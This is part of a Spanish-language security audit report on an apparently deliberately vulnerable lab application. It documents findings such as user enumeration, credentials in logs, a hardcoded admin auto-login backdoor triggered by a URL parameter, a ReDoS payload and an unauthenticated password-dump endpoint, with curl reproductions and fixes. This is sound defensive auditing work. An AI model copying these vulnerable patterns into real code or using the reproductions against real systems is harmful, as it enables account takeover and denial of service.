Los headers HTTP de las respuestas del servidor exponen información detallada sobre el stack tecnológico, versiones de software y detalles de infraestructura interna. Esta información facilita el reconocimiento del sistema por parte de atacantes, permitiéndoles identificar versiones con vulnerabilidades conocidas (CVEs) y adaptar sus ataques.

### Evidencia — Headers HTTP observados en respuestas

```http
HTTP/1.1 200 OK
X-Powered-By: Express/4.17.1 vulnerable-lab
X-AspNet-Version: 4.0.30319
X-Internal-Host: hostname-servidor-interno
Server: nginx/1.18.0 (Ubuntu)
X-Debug-Info: development-mode-active
```

**Análisis de exposición:**

| Header                  | Información expuesta                              | Riesgo                                    |
|-------------------------|---------------------------------------------------|-------------------------------------------|
| `X-Powered-By`          | Framework y versión exacta (Express 4.17.1)       | Identificación de CVEs específicos        |
| `X-AspNet-Version`      | Versión de .NET (posiblemente falso en este caso) | Confusión / fingerprinting del stack      |
| `X-Internal-Host`       | Hostname interno del servidor                     | Reconocimiento de infraestructura         |
| `Server`                | Versión de nginx/OS                               | Identificación de CVEs de servidor web    |
| `X-Debug-Info`          | Modo de desarrollo activo                         | Indica entorno no hardened                |

### Solución Recomendada

```javascript
const helmet = require('helmet');

// Helmet configura automáticamente headers de seguridad
app.use(helmet());

// Eliminar el header X-Powered-By específicamente:
app.disable('x-powered-by');

// Nunca agregar headers con información interna
// Configurar nginx para ocultar la versión: server_tokens off;
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-019: Enumeración de Usuarios via Mensajes de Error

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-019                                                         |
| **Nombre**                 | User Enumeration — Mensajes de Error Diferenciados              |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures           |
| **Tipo**                   | Information Disclosure — User Enumeration                       |
| **Severidad**              | 🟡 Media                                                        |
| **CVSS v3.1**              | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)                      |
| **Herramienta detectora**  | Revisión Manual + OWASP ZAP                                     |
| **CWE**                    | CWE-204: Observable Response Discrepancy                        |

### Descripción Técnica

El endpoint de login devuelve mensajes de error **diferentes** dependiendo de si el nombre de usuario existe en la base de datos o no. Esta diferencia permite a un atacante determinar qué nombres de usuario son válidos mediante fuerza bruta, antes de intentar crackear contraseñas.

### Evidencia — `backend/src/controllers/authController.js`

```javascript
db.get(sql, (err, user) => {
  if (!user) {
    // Mensaje cuando el usuario NO EXISTE
    return res.status(401).json({ error: 'El usuario no existe' });
    //                                    ^^^^^^^^^^^^^^^^^^^^
    //                    Confirma que el usuario es inválido
  }
  if (user.password !== password) {
    // Mensaje diferente cuando el usuario SÍ EXISTE pero la contraseña es incorrecta
    return res.status(401).json({ error: 'Password incorrecto para usuario existente' });
    //                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                    Confirma que el usuario ES VÁLIDO
  }
});
```

### Reproducibilidad

```bash
# Test de usuario inexistente:
curl -X POST http://localhost:4000/api/auth/login \
  -d '{"username": "usuario_que_no_existe", "password": "test"}'
# Respuesta: {"error": "El usuario no existe"}
# → Confirma que 'usuario_que_no_existe' NO está registrado

# Test de usuario existente:
curl -X POST http://localhost:4000/api/auth/login \
  -d '{"username": "admin", "password": "password_incorrecta"}'
# Respuesta: {"error": "Password incorrecto para usuario existente"}
# → Confirma que 'admin' SÍ está registrado
```

Un atacante puede automatizar este proceso para enumerar todos los usuarios válidos del sistema antes de lanzar un ataque de fuerza bruta de contraseñas.

### Solución Recomendada

```javascript
// Mensaje genérico indistinguible para ambos casos
if (!user || user.password !== password) {
  return res.status(401).json({ error: 'Credenciales incorrectas' });
  // Tiempo de respuesta constante con bcrypt.compare para evitar timing attacks
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 30 minutos |

---

## SEC-020: Credenciales en Logs y Consola

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-020                                                          |
| **Nombre**                 | Password y Tokens Registrados en Logs del Sistema                |
| **Categoría OWASP**        | A09:2021 – Security Logging and Monitoring Failures              |
| **Tipo**                   | Sensitive Data Exposure — Logging Credentials                    |
| **Severidad**              | 🟡 Media                                                         |
| **Herramienta detectora**  | Revisión Manual                                                  |
| **CWE**                    | CWE-532: Insertion of Sensitive Information into Log File        |

### Descripción Técnica

Se identificaron múltiples instancias donde contraseñas en texto plano, tokens de sesión y datos de autenticación son enviados a la consola mediante `console.log()`. En un entorno de producción, estos logs son almacenados en archivos o sistemas de log management (ELK, Splunk, CloudWatch), donde las credenciales quedan expuestas a cualquier persona con acceso a los logs.

### Evidencia

**`backend/src/controllers/authController.js`:**

```javascript
// INSEGURO: password en texto plano en logs
console.log('Intento de login:', username, password);
// En producción: queda registrado en los archivos de log
// Ejemplo: "Intento de login: admin admin123"
```

**`frontend/src/utils/api.js`:**

```javascript
// INSEGURO: token de sesión en logs del navegador
console.log('Llamando API con sesion:', session);
// Cualquier persona con acceso a DevTools ve el token
// Herramientas de monitoreo de RUM también capturan estos logs
```

**Impacto adicional:** Los logs del navegador son accesibles por extensiones maliciosas, herramientas de debugging y potencialmente por scripts de terceros si hay una vulnerabilidad XSS activa.

### Solución Recomendada

```javascript
// NUNCA loguear credenciales
// En lugar de:
console.log('Intento de login:', username, password);

// Usar:
console.log('Intento de login para usuario:', username);
// Omitir completamente el password

// Para el frontend, no loguear tokens en producción:
if (process.env.NODE_ENV === 'development') {
  console.debug('[API] Realizando petición autenticada');
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-021: Stack Traces Expuestos en Respuestas HTTP

| Campo                      | Detalle                                                           |
|----------------------------|-------------------------------------------------------------------|
| **Identificador**          | SEC-021                                                           |
| **Nombre**                 | Exposure of Stack Trace in HTTP Response                          |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                              |
| **Tipo**                   | Information Disclosure — Stack Trace Exposure                     |
| **Severidad**              | 🟡 Media                                                          |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                       |
| **CWE**                    | CWE-209: Generation of Error Message Containing Sensitive Information |

### Descripción Técnica

Múltiples controladores devuelven el stack trace completo de las excepciones en las respuestas HTTP de error (código 500). Esta información es valiosa para los atacantes, ya que revela la estructura interna del código, nombres de archivos, rutas del sistema, versiones de módulos y el flujo de ejecución del servidor.

### Evidencia — Múltiples controladores

```javascript
// Patrón encontrado en varios controladores:
db.get(sql, (err, result) => {
  if (err) {
    return res.status(500).json({
      error: err.message,  // Mensaje del error (revela detalles de la BD)
      stack: err.stack,    // STACK TRACE COMPLETO expuesto al cliente
      raw: err,            // El objeto error completo serializado
      sql: sql             // La consulta SQL con los parámetros (revela estructura)
    });
  }
});
```

**Ejemplo de respuesta de error expuesta al cliente:**

```json
{
  "error": "SQLITE_ERROR: no such column: nombres",
  "stack": "Error: SQLITE_ERROR: no such column: nombres\n    at Statement.<anonymous> (/app/backend/src/controllers/clientController.js:45:14)\n    at /app/backend/node_modules/sqlite3/lib/sqlite3.js:1234:23\n    at ...",
  "sql": "SELECT * FROM clients WHERE nombres LIKE '%test%'",
  "raw": { "errno": 1, "code": "SQLITE_ERROR" }
}
```

**Información revelada:** Ruta absoluta del código (`/app/backend/src/controllers/clientController.js`), número de línea exacto, estructura de la consulta SQL, versión del módulo sqlite3, estructura de directorios del servidor.

### Solución Recomendada

```javascript
// Middleware global de manejo de errores (en app.js):
app.use((err, req, res, next) => {
  // Log interno con todos los detalles (para diagnóstico)
  console.error('[ERROR]', {
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    timestamp: new Date().toISOString()
  });
  
  // Respuesta genérica al cliente (sin detalles internos)
  res.status(500).json({
    error: 'Error interno del servidor',
    // NUNCA incluir: stack, sql, raw, err.message en producción
    requestId: generateRequestId() // para correlación en logs internos
  });
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 1–2 horas |

---

## SEC-022: Auto-login Administrativo por Parámetro URL

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-022                                                            |
| **Nombre**                 | Backdoor de Autenticación via Parámetro URL                        |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures              |
| **Tipo**                   | Authentication Bypass — Hidden Backdoor                            |
| **Severidad**              | 🔴 Crítica                                                         |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                         |
| **Herramienta detectora**  | Revisión Manual del código frontend + OWASP ZAP                    |
| **CWE**                    | CWE-798: Use of Hard-coded Credentials / CWE-287: Improper Authentication |

### Descripción Técnica

El archivo `frontend/src/utils/api.js` implementa una **backdoor de autenticación automática**: si la URL contiene los parámetros `?zap=auto` o `?dast=auto`, el código frontend establece automáticamente una sesión de administrador con credenciales hardcodeadas en el bundle JavaScript. Este mecanismo fue probablemente diseñado para facilitar el análisis con OWASP ZAP, pero cualquier usuario puede usarlo para acceder como administrador sin autenticarse.

### Evidencia — `frontend/src/utils/api.js`

```javascript
// BACKDOOR: auto-login por parámetro en URL
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('zap') && urlParams.get('zap') === 'auto') {
  // Establece sesión de admin automáticamente
  localStorage.setItem('token', 'token-1-admin-admin'); // Token admin hardcodeado
  localStorage.setItem('user', JSON.stringify({
    id: 1,
    username: 'admin',
    role: 'admin',
    password: 'admin123' // Contraseña en texto plano en el bundle JS
  }));
}

// Mismo comportamiento para el parámetro dast=auto
if (urlParams.get('dast') === 'auto') {
  localStorage.setItem('token', 'token-1-admin-admin');
  // ...
}
```

### Reproducibilidad

```
// Cualquier usuario puede acceder como admin visitando:
http://localhost:5173/?zap=auto

// O en cualquier página de la aplicación:
http://localhost:5173/clients?dast=auto

// El frontend detecta el parámetro, establece el token de admin en localStorage,
// y el usuario queda autenticado como administrador sin introducir credenciales.
```

### Impacto Técnico

- Bypass completo de autenticación accesible para cualquier usuario de la red.
- Las credenciales hardcodeadas (`admin123`) son visibles en el bundle JavaScript del frontend inspeccionando el código fuente del navegador.
- Combinado con SEC-003 (token falsificable), el acceso admin es trivial por múltiples vías.

### Impacto de Negocio

- Acceso no autorizado inmediato a todas las funciones administrativas.
- Las credenciales expuestas en el bundle JS son accesibles por cualquier usuario que abra las DevTools del navegador.

### Causa Raíz

Mecanismo de conveniencia para pruebas (DAST) que fue integrado directamente en el código de producción sin ser eliminado ni protegido adecuadamente.

### Solución Recomendada

Eliminar completamente este mecanismo del código de producción. Para herramientas de DAST como ZAP, configurar las credenciales de prueba en la herramienta, no en el código:

```javascript
// Eliminar completamente el bloque de auto-login
// ZAP puede configurarse para autenticarse via el formulario de login:
// ZAP Authentication → Form-based Authentication → /api/auth/login
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Muy Baja         |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | < 30 minutos       |

---

## SEC-023: Respuesta de Login Incluye Contraseña del Usuario

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-023                                                          |
| **Nombre**                 | Password Expuesto en Respuesta JSON del Login                    |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                                |
| **Tipo**                   | Sensitive Data Exposure                                          |
| **Severidad**              | 🟠 Alta                                                          |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                       |
| **Herramienta detectora**  | OWASP ZAP + DevTools + Revisión Manual                           |
| **CWE**                    | CWE-312: Cleartext Storage of Sensitive Information              |

### Descripción Técnica

El endpoint `POST /api/auth/login` devuelve como respuesta el objeto `user` completo tal como fue recuperado de la base de datos, incluyendo el campo `password` en texto plano. Esto expone la contraseña del usuario en la respuesta HTTP de autenticación, la cual puede ser interceptada y almacenada en múltiples capas (logs de red, proxies, localStorage del navegador).

### Evidencia — `backend/src/controllers/authController.js`

```javascript
db.get(sql, (err, user) => {
  // ...
  const token = `token-${user.id}-${user.username}-${user.role}`;
  
  // VULNERABILIDAD: se devuelve el objeto user COMPLETO de la BD
  // que incluye el campo password en texto plano
  res.json({
    token,
    user  // { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: '...' }
    //  ^^^^                              ^^^^^^^^^^^^^^^^^^^^^^^^
    //  El campo password es parte del objeto user de SQLite
  });
});
```

**Respuesta HTTP real observada:**

```json
{
  "token": "token-1-admin-admin",
  "user": {
    "id": 1,
    "username": "admin",
    "password": "admin123",
    "role": "admin",
    "email": "admin@carterapro.com",
    "fullName": "Administrador"
  }
}
```

### Impacto Técnico

- La contraseña queda expuesta en DevTools (pestaña Network), logs de proxy, logs de monitoring.
- Si el usuario usa la misma contraseña en otros servicios (credential reuse), todos quedan comprometidos.
- El frontend almacena el objeto `user` en `localStorage`, persistiendo la contraseña en el navegador.

### Solución Recomendada

```javascript
// Excluir siempre el campo password de las respuestas:
const { password, ...safeUser } = user; // destructuring para excluir password
res.json({ token, user: safeUser });

// O seleccionar explícitamente en la query SQL:
const sql = "SELECT id, username, role, email, fullName FROM users WHERE username = ?";
// Sin incluir el campo password en el SELECT
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | < 30 minutos |

---

## SEC-024: Tokens de Sesión sin Expiración ni Revocación

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-024                                                          |
| **Nombre**                 | Tokens de Sesión sin Expiración, Refresh ni Mecanismo de Revocación |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures            |
| **Tipo**                   | Insecure Session Management                                      |
| **Severidad**              | 🟡 Media                                                         |
| **CVSS v3.1**              | 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)                       |
| **Herramienta detectora**  | Revisión Manual                                                  |
| **CWE**                    | CWE-613: Insufficient Session Expiration                         |

### Descripción Técnica

El sistema de tokens no implementa ningún mecanismo de expiración, renovación (refresh) ni revocación. Una vez emitido, el token `token-{id}-{username}-{role}` es **válido indefinidamente**. No existe ningún mecanismo en el servidor para invalidar tokens comprometidos, expulsar sesiones activas o forzar re-autenticación.

### Evidencia — Ausencia de controles

```javascript
// authController.js — generación de token sin expiración:
const token = `token-${user.id}-${user.username}-${user.role}`;
// No hay timestamp, no hay expiración, no hay ID de sesión único

// middleware/auth.js — verificación sin chequeo de expiración:
function weakAuth(req, res, next) {
  // No hay verificación de expiración (no existe en el token)
  // No hay revocación (no hay blacklist de tokens)
  // No hay refresh (no hay endpoint /auth/refresh)
  next();
}
```

**Escenario de impacto:**

```
1. Atacante obtiene token de admin (por SEC-003, SEC-022, o SQLi en SEC-001)
2. El token "token-1-admin-admin" es válido para siempre
3. Aunque el admin cambie su contraseña → el token sigue siendo válido
4. Aunque se detecte el compromiso → no hay forma de invalidar el token
5. El atacante mantiene acceso permanente al sistema
```

### Solución Recomendada

```javascript
// Con JWT (ver SEC-003):
// 1. Expiración corta en el token:
const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' });

// 2. Refresh token de larga duración (almacenado en httpOnly cookie):
const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '7d' });

// 3. Endpoint de revocación con blacklist (Redis):
app.post('/auth/logout', (req, res) => {
  const token = extractToken(req);
  redis.set(`blacklist:${token}`, '1', 'EX', 3600); // TTL = expiración del token
  res.json({ message: 'Sesión cerrada' });
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Alta     |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 8–16 horas |

---

## SEC-025: ReDoS — Expresiones Regulares Vulnerables

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-025                                                         |
| **Nombre**                 | Regular Expression Denial of Service (ReDoS)                   |
| **Categoría OWASP**        | A06:2021 – Vulnerable and Outdated Components                   |
| **Tipo**                   | Denial of Service — Algorithmic Complexity                      |
| **Severidad**              | 🟠 Alta                                                         |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)                      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S5852`) + Revisión Manual         |
| **CWE**                    | CWE-1333: Inefficient Regular Expression Complexity             |

### Descripción Técnica

Se identificaron dos expresiones regulares con **backtracking catastrófico** que pueden causar la denegación de servicio del servidor Node.js al procesarlas con inputs especialmente diseñados. El motor de expresiones regulares de JavaScript utiliza backtracking exponencial para estos patrones, haciendo que el tiempo de procesamiento crezca exponencialmente con la longitud del input.

### Evidencia

**`backend/src/controllers/legacyDebtController.js`:**

```javascript
// REGEX VULNERABLE: patrón con cuantificadores anidados
const vulnerableRegex1 = /^(a+)+$/;
//                          ^^^^^ Cuantificador anidado: (a+)+
// Para input "aaaa...X" (n letras 'a' seguidas de un carácter no coincidente):
// El motor intenta 2^n combinaciones diferentes de backtracking
// n=30 → ~1 billón de operaciones → servidor cuelga durante segundos/minutos
```

**`frontend/src/utils/sonarDebt.js`:**

```javascript
const vulnerableRegex2 = /^([a-z]+)+$/;
//                          ^^^^^^^^ Mismo patrón vulnerable para letras minúsculas
// Input malicioso: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
// → Backtracking exponencial → freeze del hilo de ejecución
```

### Reproducibilidad

```bash
# Endpoint que usa la regex vulnerable:
curl "http://localhost:4000/api/legacy/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
#                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 30 'a' + '!'
# Resultado: el servidor Node.js queda BLOQUEADO procesando la regex
# Todas las demás peticiones quedan en cola sin respuesta
# Efectivamente: Denegación de Servicio completa del servidor
```

**Demostración del crecimiento exponencial:**

```
Input length  | Operaciones de backtracking | Tiempo aproximado
10 letras + ! | ~1,024                      | < 1ms
20 letras + ! | ~1,048,576                  | ~1ms
30 letras + ! | ~1,073,741,824              | ~1–10 segundos
35 letras + ! | ~34,359,738,368             | > 30 segundos (DoS efectivo)
```

### Impacto Técnico

- Node.js es **single-threaded**: un regex que tarda 30 segundos bloquea **todas** las peticiones al servidor durante ese tiempo.
- El atacante puede mantener el servidor degradado con peticiones periódicas simples.
- No requiere autenticación (el endpoint no está protegido).

### Solución Recomendada

```javascript
// Reemplazar con regex equivalentes sin backtracking catastrófico:

// ❌ Vulnerable:
/^(a+)+$/

// ✅ Equivalente seguro (sin cuantificadores anidados):
/^a+$/

// ❌ Vulnerable:
/^([a-z]+)+$/

// ✅ Equivalente seguro:
/^[a-z]+$/

// Para validaciones más complejas, usar la librería 're2' que implementa
// NFA-based matching sin backtracking exponencial:
const RE2 = require('re2');
const safeRegex = new RE2('^[a-z]+$');
safeRegex.test(input); // tiempo lineal garantizado
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-026: Criptografía Débil — MD5 y Math.random()

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-026                                                         |
| **Nombre**                 | Algoritmos Criptográficos Inseguros — MD5 y Math.random()       |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                               |
| **Tipo**                   | Weak Cryptography                                               |
| **Severidad**              | 🟠 Alta                                                         |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                      |
| **Herramienta detectora**  | SonarQube (reglas: `javascript:S4790`, `javascript:S2245`) + Manual |
| **CWE**                    | CWE-327: Use of a Broken or Risky Cryptographic Algorithm / CWE-338: Use of Cryptographically Weak PRNG |

### Descripción Técnica

Se identificaron dos usos de algoritmos y funciones criptográficamente débiles:

1. **MD5** para hashing: MD5 tiene colisiones conocidas y su velocidad de computación (millones de hashes por segundo en GPU) lo hace inadecuado para almacenamiento de contraseñas.
2. **Math.random()** para generación de tokens: `Math.random()` es un generador de números pseudoaleatorios (PRNG) sin propiedades criptográficas. Sus valores son predecibles y no deben usarse para generar tokens de seguridad.

### Evidencia — `backend/src/controllers/legacyDebtController.js`

```javascript
const crypto = require('crypto');

// USO DE MD5 — algoritmo criptográficamente roto
function weakCryptoDemo(data) {
  // MD5 está roto para propósitos criptográficos desde 2004
  // Velocidad: ~10 billones de hash/segundo con GPU moderna
  // Para contraseñas: completamente inadecuado
  const md5Hash = crypto.createHash('md5').update(data).digest('hex');
  
  // Math.random() — NO criptográficamente seguro
  // Es un PRNG determinístico — predecible si se conoce la semilla
  const weakToken = Math.random().toString(36).substring(2);
  // Este "token" puede ser predicho por un atacante con suficientes muestras
  
  return { md5Hash, weakToken };
}
```

### Impacto Técnico

- **MD5 para contraseñas:** Una GPU moderna puede calcular ~10^10 MD5 por segundo. Un hash MD5 de una contraseña de 8 caracteres puede ser crackeado en segundos con rainbow tables o fuerza bruta.
- **Math.random() para tokens:** Los tokens generados con `Math.random()` pueden ser predecibles, permitiendo a un atacante predecir o forzar tokens de sesión.

### Solución Recomendada

```javascript
// Para hashing de contraseñas → bcrypt (diseñado para ser lento):
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);

// Para hashing de integridad (no contraseñas) → SHA-256:
const sha256 = crypto.createHash('sha256').update(data).digest('hex');

// Para tokens criptográficamente seguros → crypto.randomBytes:
const secureToken = crypto.randomBytes(32).toString('hex');
// 256 bits de entropía real — imposible de predecir
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 1–2 horas |

---

## SEC-027: Consultas SQL Expuestas en Respuestas de Error

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-027                                                            |
| **Nombre**                 | SQL Query Disclosure in Error Responses                            |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                               |
| **Tipo**                   | Information Disclosure — SQL Structure Exposure                    |
| **Severidad**              | 🟡 Media                                                           |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                        |
| **CWE**                    | CWE-209: Generation of Error Message Containing Sensitive Information |

### Descripción Técnica

Múltiples controladores exponen la consulta SQL completa en las respuestas de error HTTP. Esta información proporciona a un atacante un mapa exacto de la estructura de la base de datos: nombres de tablas, nombres de columnas, tipos de datos y relaciones entre tablas. Esta información es valiosa para diseñar ataques de SQL injection más sofisticados.

### Evidencia — Múltiples controladores

**`authController.js`:**

```javascript
db.get(sql, (err, user) => {
  if (err) {
    return res.status(500).json({
      error: err.message,
      sql   // EXPOSICIÓN: la query con el input del usuario es devuelta en el error
      //  → "SELECT * FROM users WHERE username = 'input_malicioso'"
    });
  }
});
```

**`clientController.js`:**

```javascript
db.all(searchSql, (err, rows) => {
  if (err) {
    return res.status(500).json({
      error: err.message,
      sql: searchSql  // EXPOSICIÓN: revela estructura de la tabla clients
      // → "SELECT * FROM clients WHERE name LIKE '%input%'"
    });
  }
});
```

**Información revelada en respuestas de error:**

```json
{
  "error": "SQLITE_ERROR: no such column: nombres",
  "sql": "SELECT id, name, email, phone, address, notes, active, creditScore FROM clients WHERE nombres LIKE '%test%'"
}
```

La respuesta anterior revela exactamente: nombre de la tabla (`clients`), nombres de todas las columnas (`id, name, email, phone, address, notes, active, creditScore`), y la estructura de la query utilizada.

### Solución Recomendada

```javascript
// Manejo de errores que NO expone detalles internos:
db.all(sql, params, (err, rows) => {
  if (err) {
    // Log interno con todos los detalles para diagnóstico
    console.error('[clientController] DB Error:', { message: err.message, sql, params });
    // Respuesta genérica al cliente
    return res.status(500).json({ error: 'Error interno al procesar la solicitud' });
  }
  res.json(rows);
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 1 hora    |

---

## SEC-028: Endpoint /api/auth/users Expone Contraseñas sin Autenticación

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-028                                                            |
| **Nombre**                 | Mass User Data Disclosure — Endpoint Público sin Autenticación    |
| **Categoría OWASP**        | A01:2021 – Broken Access Control                                   |
| **Tipo**                   | Broken Access Control + Sensitive Data Exposure                    |
| **Severidad**              | 🔴 Crítica                                                         |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                         |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                        |
| **CWE**                    | CWE-306: Missing Authentication for Critical Function / CWE-312: Cleartext Storage |

### Descripción Técnica

El endpoint `GET /api/auth/users` devuelve la lista completa de todos los usuarios del sistema con sus contraseñas en texto plano, sin requerir ningún tipo de autenticación. Cualquier persona con acceso a la red donde está expuesto el servidor puede obtener todos los nombres de usuario, contraseñas, roles y datos personales con una única petición HTTP.

### Evidencia — `backend/src/controllers/authController.js`

```javascript
// Endpoint que expone TODOS los usuarios con sus contraseñas
router.get('/users', (req, res) => {
  // Sin middleware de autenticación
  // Sin verificación de rol
  // Sin paginación ni restricción de campos
  
  db.all('SELECT * FROM users', [], (err, users) => {
    //                    ^^^
    //          SELECT * incluye el campo password en texto plano
    if (err) return res.status(500).json({ error: err.message });
    res.json(users); // Lista completa de usuarios con passwords
  });
});
```

### Reproducibilidad

```bash
# Sin autenticación, sin token, sin ningún requisito:
curl http://localhost:4000/api/auth/users

# Respuesta:
[
  { "id": 1, "username": "admin",   "password": "admin123",    "role": "admin" },
  { "id": 2, "username": "jperez",  "password": "password456", "role": "user"  },
  { "id": 3, "username": "mgarcia", "password": "secret789",   "role": "manager" },
  { "id": 4, "username": "rlopez",  "password": "rlopez2024",  "role": "user"  }
]
```

### Impacto Técnico

- Exposición inmediata de **todas las credenciales** del sistema con una única petición anónima.
- Los datos obtenidos permiten acceso directo como cualquier usuario, incluyendo administradores.
- Sin necesidad de explotar ninguna otra vulnerabilidad — el ataque es trivial.
- Posible uso para ataques de credential stuffing contra otros servicios.

### Impacto de Negocio

- Violación masiva de datos de usuarios — incumplimiento inmediato de RGPD/LOPD.
- Compromiso de todos los usuarios del sistema sin ningún esfuerzo por parte del atacante.
- En combinación con otras vulnerabilidades (RCE, SSRF), permite compromiso total del sistema desde cero.

### Causa Raíz

Endpoint de administración/utilidad creado sin aplicar ningún control de acceso, probablemente para facilitar el desarrollo o las pruebas.

### Solución Recomendada

```javascript
// Proteger con autenticación y autorización de administrador:
router.get('/users', authenticateToken, requireAdmin, (req, res) => {
  // Excluir contraseñas y datos sensibles del resultado:
  db.all(
    'SELECT id, username, role, email, fullName, created_at FROM users',
    [],
    (err, users) => {
      if (err) {
        console.error('[getUsers] DB Error:', err.message);
        return res.status(500).json({ error: 'Error al obtener usuarios' });
      }
      res.json(users);
    }
  );
});
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Baja             |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 1 hora             |

---

---

> **Fin del documento — Parte 1**
>
> Este documento cubre las Secciones 1 a 5 del Informe Técnico de Auditoría de Seguridad de CarteraPro Risk Lab, incluyendo 10 hallazgos de calidad (CAL-001 a CAL-010) y 28 hallazgos de seguridad (SEC-001 a SEC-028), con evidencia de código, reproducibilidad demostrada y recomendaciones técnicas de remediación.
>
> **Documento:** `auditoria/informe_tecnico_parte1.md`  
> **Emisión:** 2026-06-13  
> **Equipo:** Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software  
> **Clasificación:** CONFIDENCIAL
